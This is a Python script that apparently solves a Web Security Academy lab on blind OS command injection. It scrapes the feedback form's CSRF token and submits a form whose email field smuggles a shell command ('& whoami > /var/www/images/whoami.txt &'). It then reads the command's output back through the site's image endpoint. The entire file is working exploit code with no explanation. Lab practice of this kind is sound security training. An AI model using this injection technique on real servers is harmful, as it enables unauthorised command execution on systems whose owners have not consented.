import requests
import bs4
from bs4 import BeautifulSoup
import os
from urllib.parse import urljoin


base = 'https://ac2b1fd91fa9c807c043d65900110089.web-security-academy.net/'

get_response = requests.get(urljoin(base, 'feedback'))
html = get_response.content.decode('utf-8')
soup = BeautifulSoup(html, 'html5lib')
csrf_input = soup.find('input', {'name': 'csrf'})
csrf_token = csrf_input['value']

print(csrf_token)
data = {
  'csrf': csrf_token,
  'name': ';',
  'email': '& whoami > /var/www/images/whoami.txt &',
  'subject': 'echo',
  'message': 'bla'
}

response = requests.post(urljoin(base, '/feedback/submit'), data=data, cookies=get_response.cookies)
print(response.content.decode('utf-8'))

response = requests.get(urljoin(base, 'image?filename=whoami.txt'), data=data)
print(response.content.decode('utf-8'))
